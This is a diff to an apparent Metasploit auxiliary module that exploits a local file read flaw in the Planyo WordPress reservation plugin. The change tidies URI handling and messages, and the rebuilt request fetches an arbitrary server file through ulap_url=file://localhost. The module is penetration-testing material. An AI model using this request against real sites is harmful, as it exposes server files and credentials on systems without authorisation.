@@ -47,9 +47,15 @@ class MetasploitModule < Msf::Auxiliary
 
   # Plugin versions prior to 3.1 do not have a stable tag or version in readme.txt. So implemented a module to extract version from changelog portion of readme.txt
   def check_plugin_version_from_changelog(fixed_version)
-    changelog_url = '/wp-content/plugins/planyo-online-reservation-system/readme.txt'
+    changelog_url = normalize_uri(
+      datastore['TARGETURI'],
+      'wp-content',
+      'plugins',
+      'planyo-online-reservation-system',
+      'readme.txt'
+    )
     res = send_request_cgi(
-      'uri' => "/#{datastore['TARGETURI']}/#{changelog_url}",
+      'uri' => changelog_url,
       'method' => 'GET'
     )
 
@@ -86,28 +92,36 @@ class MetasploitModule < Msf::Auxiliary
     readme_code = check_plugin_version_from_readme('planyo-online-reservation-system', '3.0')
 
     if readme_code == Msf::Exploit::CheckCode::Unknown
-      print_error('Plugin\'s version could not be found. Try overriding vulnerability check')
+      print_error('Planyo plugin\'s version could not be found. Try overriding vulnerability check')
       return
     elsif readme_code == Msf::Exploit::CheckCode::Safe
-      print_good("Plugin found: #{readme_code.details}")
+      print_good("Planyo plugin found: #{readme_code.details}")
       print_error('This version of plugin is not vulnerable')
       return
     # Check version from changelog section if stable tag or version details are not present in readme.txt
     elsif readme_code == Msf::Exploit::CheckCode::Detected
       changelog_code = check_plugin_version_from_changelog('3.0')
       if changelog_code == Msf::Exploit::CheckCode::Safe
-        print_good("Plugin found: #{changelog_code.details}")
+        print_good("Planyo plugin found: #{changelog_code.details}")
         print_error('This version of plugin is not vulnerable')
         return
       end
     end
-    print_good('Vulnerable version of plugin detected')
+    print_good('Vulnerable version of Planyo plugin detected')
 
     # Create request
-    route = 'wp-content/plugins/planyo-online-reservation-system/ulap.php?ulap_url=file://localhost'
+    route = normalize_uri(
+      datastore['TARGETURI'],
+      'wp-content',
+      'plugins',
+      'planyo-online-reservation-system',
+      'ulap.php'
+    )
+    route += "?ulap_url=file://localhost#{datastore['FILEPATH']}"
+
     res = send_request_raw({
       'method' => 'GET',
-      'uri' => "/#{datastore['TARGETURI']}/#{route}/#{datastore['FILEPATH']}"
+      'uri' => route
     }, 25)
 
     unless res
